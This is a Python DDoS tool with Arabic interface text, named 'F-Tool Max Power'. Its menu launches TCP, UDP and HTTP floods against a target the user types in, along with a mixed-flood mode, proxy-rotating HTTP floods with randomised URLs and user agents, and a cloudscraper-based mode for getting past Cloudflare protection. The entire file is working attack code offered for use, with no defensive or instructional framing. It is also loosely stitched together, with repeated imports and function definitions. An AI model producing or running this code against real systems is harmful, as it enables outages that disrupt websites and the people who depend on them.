
def ddos_attack(target_ip_or_url, port, duration, threads_count):
    end_time = time.time() + duration
    payload = random._urandom(2048)
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
    ]

    def tcp():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target_ip_or_url, port))
                s.send(payload)
                s.close()
                print(f"[TCP] -> {target_ip_or_url}:{port}")
            except:
                pass

    def udp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                sock.sendto(payload, (target_ip_or_url, port))
                print(f"[UDP] -> {target_ip_or_url}:{port}")
            except:
                pass

    def http():
        while time.time() < end_time:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Connection": "keep-alive"
                }
                url = f"http://{target_ip_or_url}/?id={random.randint(1000,9999)}"
                requests.get(url, headers=headers, timeout=3)
                print(f"[HTTP] -> {url}")
            except:
                pass

    threads = []
    for _ in range(threads_count):
        threads.append(threading.Thread(target=tcp))
        threads.append(threading.Thread(target=udp))
        threads.append(threading.Thread(target=http))

    print(f"بدء هجوم DDoS المدمج على {target_ip_or_url}:{port} لمدة {duration} ثانية...")
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("انتهى الهجوم.")


import asyncio
import httpx
import random
import os
import time

def load_proxies(filename="proxies.txt"):
    proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
    return proxies

async def super_bypass_http_flood(target_url, duration, concurrent_requests):
    end_time = time.time() + duration
    proxies = load_proxies()
    use_proxies = len(proxies) > 0

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    async def flood():
        session_proxy = f"http://{random.choice(proxies)}" if use_proxies else None
        async with httpx.AsyncClient(proxies=session_proxy, follow_redirects=True, timeout=10) as client:
            while time.time() < end_time:
                try:
                    rand_path = f"/page{random.randint(100,999)}"
                    rand_query = f"?id={random.randint(100000,999999)}&ref={random.randint(1000,9999)}"
                    url = target_url.rstrip("/") + rand_path + rand_query

                    headers = base_headers.copy()
                    headers["Referer"] = target_url

                    await client.get(url, headers=headers)
                    print(f"[BYPASS++] -> {url}")
                except Exception as e:
                    print(f"[-] خطأ: {e}")

    print(f"بدء هجوم Bypass القوي على {target_url} لمدة {duration} ثانية...")
    tasks = [asyncio.create_task(flood()) for _ in range(concurrent_requests)]
    await asyncio.gather(*tasks)

def run_super_bypass():
    target_url = input("أدخل الرابط (مثال: https://example.com): ").strip()
    duration = int(input("أدخل المدة (بالثواني): "))
    concurrent_requests = int(input("عدد الاتصالات المتزامنة (مثلاً 500): "))
    asyncio.run(super_bypass_http_flood(target_url, duration, concurrent_requests))


import asyncio
import httpx
import random
import os
import time

def load_proxies(filename="proxies.txt"):
    proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
    return proxies

async def bypass_http_flood(target_url, duration, concurrent_requests):
    end_time = time.time() + duration
    proxies = load_proxies()
    use_proxies = len(proxies) > 0

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Referer": target_url
    }

    async def flood():
        proxy = f"http://{random.choice(proxies)}" if use_proxies else None
        async with httpx.AsyncClient(proxies=proxy, headers=headers, follow_redirects=True) as client:
            while time.time() < end_time:
                try:
                    url = target_url + f"?q={random.randint(1000, 999999)}"
                    await client.get(url, timeout=5)
                    print(f"[BYPASS] -> {url}")
                except Exception as e:
                    print(f"[-] خطأ: {e}")

    print(f"بدء هجوم HTTP مع Bypass على {target_url} لمدة {duration} ثانية...")
    tasks = [asyncio.create_task(flood()) for _ in range(concurrent_requests)]
    await asyncio.gather(*tasks)

def run_bypass_http():
    target_url = input("أدخل الرابط (مثال: https://example.com): ").strip()
    duration = int(input("أدخل المدة (بالثواني): "))
    concurrent_requests = int(input("عدد الاتصالات المتزامنة (يفضل 100-1000): "))
    asyncio.run(bypass_http_flood(target_url, duration, concurrent_requests))


import os

def load_proxies(filename="proxies.txt"):
    proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
    return proxies


import asyncio
import aiohttp
import threading
import socket
import time
import random

# ========== HTTP FLOOD (ASYNCIO) ==========
async def async_http_flood(target_url, duration, concurrent_requests):
    proxies = load_proxies()
    use_proxies = len(proxies) > 0
    end_time = time.time() + duration
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
    ]

    async def flood(session):
        while time.time() < end_time:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Connection": "keep-alive"
                }
                url = target_url + f"?id={random.randint(1, 999999)}"
                proxy = random.choice(proxies) if use_proxies else None
                async with session.get(url, headers=headers, proxy=f"http://{proxy}" if proxy else None, timeout=5):
                    print(f"[HTTP] -> {url}")
            except:
                pass

    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(flood(session)) for _ in range(concurrent_requests)]
        await asyncio.gather(*tasks)

def run_http_flood():
    target_url = input("أدخل الرابط (مثال: https://example.com): ").strip()
    duration = int(input("أدخل المدة (بالثواني): "))
    concurrent_requests = int(input("عدد الاتصالات المتزامنة (يفضل 100-1000): "))
    print("بدء هجوم HTTP Async مكثف...")
    asyncio.run(async_http_flood(target_url, duration, concurrent_requests))
    print("انتهى الهجوم.")

# ========== TCP FLOOD (BOOSTED) ==========
def tcp_flood(target_ip, port, duration, threads_count):
    end_time = time.time() + duration
    payload = random._urandom(8192)

    def flood():
        while time.time() < end_time:
            try:
                for _ in range(5):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target_ip, port))
                    for _ in range(10):
                        s.send(payload)
                    s.close()
                    print(f"[TCP] -> {target_ip}:{port}")
            except:
                pass

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("انتهى هجوم TCP.")

# ========== UDP FLOOD (BOOSTED) ==========
def udp_flood(target_ip, port, duration, threads_count):
    end_time = time.time() + duration
    payload = random._urandom(8192)

    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                for _ in range(50):
                    sock.sendto(payload, (target_ip, port))
                print(f"[UDP] -> {target_ip}:{port}")
            except:
                pass

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("انتهى هجوم UDP.")

# ========== MENU ==========
def main():
    print("""أداة F-Tool Max Power
اختر نوع الهجوم:
[1] HTTP Flood (Async)
[7] Cloudflare Bypass (Powered)
[2] TCP Flood (Boosted)
[3] UDP Flood (Boosted)
[4] HTTP Flood (Bypass Cloudflare)
[5] HTTP Flood (MAX BYPASS)
[6] DDoS Attack (Mix TCP + UDP + HTTP)
""")
    choice = input("اختيارك: ").strip()
    if choice == "1":
        run_http_flood()
    elif choice == "2":
        target_ip = input("أدخل IP الهدف: ").strip()
        port = int(input("أدخل البورت: "))
        duration = int(input("المدة (ثواني): "))
        threads = int(input("عدد الثريدات: "))
        tcp_flood(target_ip, port, duration, threads)
    elif choice == "3":
        target_ip = input("أدخل IP الهدف: ").strip()
        port = int(input("أدخل البورت: "))
        duration = int(input("المدة (ثواني): "))
        threads = int(input("عدد الثريدات: "))
        udp_flood(target_ip, port, duration, threads)
    elif choice == "4":
        run_bypass_http()
    elif choice == "5":
        run_super_bypass()
    elif choice == "6":
        target = input("أدخل IP أو رابط الهدف (بدون http): ").strip()
        port = int(input("أدخل البورت (مثلاً 80): "))
        duration = int(input("المدة (ثواني): "))
        threads = int(input("عدد الثريدات لكل نوع: "))
        ddos_attack(target, port, duration, threads)
    elif choice == "7":
        run_cloudflare_bypass()
    else:
        print("خيار غير معروف.")

if __name__ == "__main__":
    main()

import cloudscraper

def run_cloudflare_bypass():
    target_url = input("أدخل الرابط (مثال: https://example.com): ").strip()
    duration = int(input("أدخل المدة (بالثواني): "))
    concurrent_requests = int(input("عدد الاتصالات المتزامنة (مثلاً 500): "))
    proxies = load_proxies()
    use_proxies = len(proxies) > 0
    end_time = time.time() + duration

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    ]

    def flood():
        scraper = cloudscraper.create_scraper()
        while time.time() < end_time:
            try:
                proxy = random.choice(proxies) if use_proxies else None
                if proxy:
                    scraper.proxies.update({
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    })
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Connection": "keep-alive",
                    "Referer": target_url,
                    "Accept": "*/*",
                }
                rand_path = f"/?id={random.randint(100000, 999999)}"
                full_url = target_url.rstrip("/") + rand_path
                scraper.get(full_url, headers=headers, timeout=5)
                print(f"[CF-BYPASS] -> {full_url}")
            except Exception as e:
                print(f"[X] خطأ: {e}")

    threads = []
    for _ in range(concurrent_requests):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("انتهى هجوم Cloudflare Bypass.")
